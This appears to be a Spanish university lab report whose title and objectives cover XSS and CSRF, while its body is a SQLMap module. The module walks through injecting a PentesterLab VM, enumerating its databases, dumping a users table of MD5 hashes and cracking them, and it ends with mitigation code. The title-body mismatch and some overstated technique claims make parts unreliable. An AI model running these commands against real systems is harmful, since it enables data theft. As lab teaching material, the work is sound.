# Práctica Nro. 6: Cross-Site Scripting (XSS) y Cross-Site Request Forgery (CSRF)

## Datos de Identificación

| Apellido, Nombre | Cédula de Identidad | Nro. de Práctica | Fecha |
| :--- | :---: | :---: | :--- |
| Gil, Jesús | 30175126 | 6 | 31-10-2025|
| Guilarte, Andrés | 30246084 | 6 | 31-10-2025 |

**Nombre de la Práctica:** Cross-Site Scripting (XSS) y Cross-Site Request Forgery (CSRF)

**Grupo:** 4
_______________________________________

## Objetivos de Aprendizaje

Al finalizar este laboratorio, el estudiante será capaz de:

1.  Identificar y explotar vulnerabilidades de Cross-Site Scripting (XSS) Reflejado, Almacenado y Basado en DOM.
2.  Comprender el impacto de los ataques XSS, como el robo de cookies y la suplantación de sesiones.
3.  Utilizar herramientas como OWASP ZAP para automatizar la detección de vulnerabilidades XSS.
4.  Entender el mecanismo de los ataques de Cross-Site Request Forgery (CSRF) y cómo se diferencian de XSS.
5.  Explotar vulnerabilidades CSRF para realizar acciones no autorizadas en nombre de un usuario.
6.  Implementar y verificar contramedidas para mitigar XSS y CSRF, como la validación de entradas, codificación de salidas y tokens anti-CSRF.
7.  Analizar el código fuente para identificar patrones de programación inseguros que conducen a estas vulnerabilidades.
8.  Generar reportes de seguridad documentando los hallazgos y las recomendaciones de mitigación.

_____________________________________

### Recursos Tecnológicos

- 💻 Kali Linux (actualizado, mínimo 4GB RAM)
- 💻 Metasploitable 2 (configurado en red NAT o Host-Only con DVWA)
- 🌐 Conexión a Internet para actualizaciones
- 📦 VirtualBox o VMware con configuración de red adecuada
- 🧰 Herramientas: OWASP ZAP, Burp Suite (opcional), navegadores web con herramientas de desarrollador.

________________________________________

## Software Requerido

### Verificar instalaciones necesarias

```bash
which zaproxy      # OWASP ZAP
which burpsuite    # Burp Suite (Opcional)
```

## 🗄️ MÓDULO 4: Explotación Automatizada con SQLMap

### Objetivos del Módulo

-   Comprender el funcionamiento de SQLMap
-   Automatizar la detección y explotación de inyecciones SQL
-   Enumerar bases de datos, tablas y columnas
-   Extraer información sensible de forma controlada
-   Documentar la estructura completa de una base de datos

### 📝 Procedimiento Paso a Paso

PASO 1: Preparar el Entorno PentesterLab
1. Iniciar la máquina virtual PentesterLab
   - En VirtualBox, seleccione la VM PentesterLab
   - Haga clic en Iniciar
2. Obtener la dirección IP:
   - Una vez iniciada, la VM mostrará su IP en la pantalla de login
   - 📝 Anote la IP: ___________________
   - Ejemplo: 192.168.56.103
3. Verificar conectividad desde Kali:
```bash
ping -c 4 [IP_PENTESTERLAB]
```
✔️ Punto de Verificación: Debe recibir respuestas exitosas.

PASO 2: Acceder a la Aplicación Vulnerable
1. En Firefox (Kali Linux), navegue a:
```
http://[IP_PENTESTERLAB]
```
2. En la página principal, localice la sección:
SQL Injections → Example 1
3. Haga clic en "Example 1"
📸 Captura esperada: Página con una galería de imágenes y parámetros en la URL:
```
http://192.168.56.103/sqli/example1.php?id=1
```

PASO 3: Verificar Vulnerabilidad Manualmente
Antes de usar SQLMap, confirme manualmente la vulnerabilidad:
1. Modifique la URL agregando una comilla simple:
```
http://[IP]/sqli/example1.php?id=1'
```
📊 Resultado esperado: Error de SQL visible:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version...
✅ Confirmación: La aplicación es vulnerable a inyección SQL.

PASO 4: Comando 1 - Fingerprinting de la Base de Datos
Objetivo: Identificar el tipo y versión del sistema de gestión de base de datos.
```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" --fingerprint
```
💡 Explicación de parámetros:
- -u: URL objetivo con parámetro vulnerable
- --fingerprint: Realiza análisis detallado del DBMS
📊 Salida esperada (resumen):
[*] starting @ 00:49:15

[00:49:15] [INFO] testing connection to the target URL
[00:49:15] [INFO] testing if the target URL content is stable
[00:49:16] [INFO] target URL content is stable
[00:49:16] [INFO] testing if GET parameter 'id' is dynamic
[00:49:16] [INFO] GET parameter 'id' appears to be dynamic
[00:49:16] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[00:49:16] [INFO] testing for SQL injection on GET parameter 'id'

[00:49:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:49:27] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable

back-end DBMS: active fingerprint: MySQL >= 5.0.12
               comment injection fingerprint: MySQL 5.0.51
               html error message fingerprint: MySQL

[*] ending @ 00:49:30
🔍 Análisis:
Información	Valor	Significado
DBMS	MySQL	Sistema de base de datos
Versión	>= 5.0.12	Versión mínima detectada
Versión específica	5.0.51	Versión exacta identificada
Técnica efectiva	Time-based blind	Inyección basada en tiempo
📝 Documentar:
- Sistema: MySQL
- Versión: 5.0.51
- Técnica: Time-based blind injection

PASO 5: Comando 2 - Identificar Usuario Actual
Objetivo: Determinar con qué usuario la aplicación se conecta a la base de datos.
```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" --current-user
```
💡 Explicación:
- --current-user: Extrae el nombre del usuario de la conexión a la BD
📊 Salida esperada:
[00:50:12] [INFO] fetching current user
[00:50:12] [INFO] retrieved: root@localhost
current user: 'root@localhost'
🔍 Análisis:
⚠️ HALLAZGO CRÍTICO: La aplicación se conecta como root, el usuario con máximos privilegios en MySQL.
Implicaciones de seguridad:
- ✅ El atacante puede leer cualquier base de datos
- ✅ El atacante puede modificar cualquier tabla
- ✅ El atacante puede ejecutar comandos del sistema (con UDF)
- ✅ El atacante puede leer archivos del servidor (LOAD_FILE)
🛡️ Buena práctica: La aplicación debería usar un usuario con privilegios mínimos (principio de menor privilegio).

PASO 6: Comando 3 - Enumerar Bases de Datos
Objetivo: Listar todas las bases de datos accesibles.
```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" --dbs
```
💡 Explicación:
- --dbs: Enumera todas las bases de datos
📊 Salida esperada (resumen):
[00:51:05] [INFO] fetching database names
[00:51:05] [INFO] used SQL query returns 3 entries
[00:51:05] [INFO] retrieved: information_schema
[00:51:06] [INFO] retrieved: exercises
[00:51:06] [INFO] retrieved: mysql

available databases [3]:
[*] exercises
[*] information_schema
[*] mysql

🔍 Análisis de Bases de Datos:
Base de Datos	Descripción	Sensibilidad
information_schema	Metadatos del sistema MySQL	🟡 Media - Contiene estructura de todas las BDs
exercises	Base de datos de la aplicación	🔴 Alta - Contiene datos de usuarios
mysql	Base de datos del sistema MySQL	🔴 Crítica - Contiene hashes de contraseñas
📝 Documentar:
- Total de BDs: 3
- BD objetivo: exercises
- BDs del sistema: information_schema, mysql

PASO 7: Comando 4 - Enumerar Tablas
Objetivo: Listar todas las tablas de la base de datos exercises.
```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" -D exercises --tables
```
💡 Explicación:
- -D exercises: Especifica la base de datos objetivo
- --tables: Enumera las tablas de esa base de datos
📊 Salida esperada:
[00:52:30] [INFO] fetching tables for database: 'exercises'
[00:52:30] [INFO] used SQL query returns 2 entries
[00:52:31] [INFO] retrieved: photos
[00:52:31] [INFO] retrieved: users

Database: exercises
[2 tables]
+---------+
| photos  |
| users   |
+---------+
🔍 Análisis:
Tabla	Contenido Probable	Sensibilidad
photos	Información de imágenes (id, nombre, ruta)	🟡 Media
users	Información de usuarios (username, password, email)	🔴 Alta
📝 Documentar:
- Total de tablas: 2
- Tabla crítica: users

PASO 8: Comando 5 - Enumerar Columnas
Objetivo: Listar todas las columnas de la tabla users.
```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" -D exercises -T users --columns
```
💡 Explicación:
- -T users: Especifica la tabla objetivo
- --columns: Enumera las columnas de esa tabla
📊 Salida esperada (resumen):
[00:53:45] [INFO] fetching columns for table 'users' in database 'exercises'
[00:53:45] [INFO] used SQL query returns 4 entries
[00:53:46] [INFO] retrieved: id
[00:53:46] [INFO] retrieved: int(11)
[00:53:47] [INFO] retrieved: username
[00:53:47] [INFO] retrieved: varchar(100)
[00:53:48] [INFO] retrieved: password
[00:53:48] [INFO] retrieved: varchar(100)
[00:53:49] [INFO] retrieved: email
[00:53:49] [INFO] retrieved: varchar(100)

Database: exercises
Table: users
[4 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| username | varchar(100) |
| password | varchar(100) |
| email    | varchar(100) |
+----------+--------------+
🔍 Análisis de Estructura:
Columna	Tipo	Descripción	Sensibilidad
id	int(11)	Identificador único del usuario	🟢 Baja
username	varchar(100)	Nombre de usuario	🟡 Media
password	varchar(100)	Contraseña (posiblemente hasheada)	🔴 Crítica
email	varchar(100)	Correo electrónico	🔴 Alta

PASO 9: Extraer Datos de la Tabla (Reto Avanzado)
⚠️ ADVERTENCIA ÉTICA: Esta acción extrae datos sensibles. Solo debe realizarse en entornos de prueba autorizados.
```bash
sqlmap -u "http://[IP_PENTESTERLAB]/sqli/example1.php?id=1" -D exercises -T users --dump
```
💡 Explicación:
- --dump: Extrae y muestra todos los datos de la tabla
📊 Salida esperada (resumen):
Database: exercises
Table: users
[3 entries]
+----+----------+----------------------------------+-------------------+
| id | username | password                         | email             |
+----+----------+----------------------------------+-------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 | admin@example.com |
| 2  | john     | 098f6bcd4621d373cade4e832627b4f6 | john@example.com  |
| 3  | jane     | 5f4dcc3b5aa765d61d8327deb882cf99 | jane@example.com  |
+----+----------+----------------------------------+-------------------+
🔍 Análisis de Contraseñas:
Las contraseñas están hasheadas con MD5. SQLMap puede intentar crackearlas:
# SQLMap detectará automáticamente MD5 y preguntará si desea crackearlas via diccionario
# Responda 'Y' cuando pregunte: "do you want to crack them via a dictionary-based attack?"
Resultado del cracking: Genere una tabla o captura de pantalla del resultado

📊 Diagrama de la Estructura de la Base de Datos

### 🛡️ Técnicas de SQLMap Utilizadas
Durante el proceso, SQLMap empleó múltiples técnicas:

📊 Resumen de Técnicas:
[00:49:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:49:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[00:49:27] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[00:49:28] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:49:30] [INFO] automatically extending ranges for UNION query injection technique tests
[00:49:31] [INFO] target URL appears to have 3 columns in query
Técnicas detectadas:
1. ✅ Boolean-based blind: Probada, no efectiva en este caso
2. ✅ Time-based blind: Efectiva, utilizada para extracción
3. ✅ UNION query: Efectiva, 3 columnas detectadas
4. ✅ Error-based: Efectiva, mensajes de error reveladores

### 🔒 Mitigación de Inyecciones SQL
Código Vulnerable (PHP):
```php
<?php
// ❌ VULNERABLE
$id = $_GET['id'];
$query = "SELECT * FROM photos WHERE id = $id";
$result = mysql_query($query);
?>
```
Código Seguro (Prepared Statements con PDO):
```php
<?php
// ✅ SEGURO
try {
    $pdo = new PDO('mysql:host=localhost;dbname=exercises', 'user', 'pass');
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    $stmt = $pdo->prepare("SELECT * FROM photos WHERE id = :id");
    $stmt->bindParam(':id', $_GET['id'], PDO::PARAM_INT);
    $stmt->execute();
    
    $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch(PDOException $e) {
    // No revelar detalles del error al usuario
    error_log($e->getMessage());
    die("Error en la base de datos");
}
?>
```
Medidas de protección adicionales:
1. Validación de entrada:
```php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false) {
    die("ID inválido");
}
```
2. Principio de menor privilegio:
```sql
-- Crear usuario con permisos limitados
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'secure_password';
GRANT SELECT ON exercises.photos TO 'webapp'@'localhost';
GRANT SELECT ON exercises.users TO 'webapp'@'localhost';
FLUSH PRIVILEGES;
```
3. WAF (Web Application Firewall):
```apache
# ModSecurity rules para prevenir SQL Injection
SecRule ARGS "@detectSQLi" \
    "id:1000,phase:2,deny,status:403,msg:'SQL Injection Detected'"
```

### Preguntas de Reflexión - Módulo 4
1. ¿Por qué SQLMap utilizó "time-based blind" en lugar de otras técnicas?
2. ¿Qué información adicional podría extraerse de la base de datos mysql?
3. ¿Por qué es peligroso que las contraseñas estén hasheadas solo con MD5?
4. ¿Cómo podría un atacante usar la función LOAD_FILE() de MySQL?

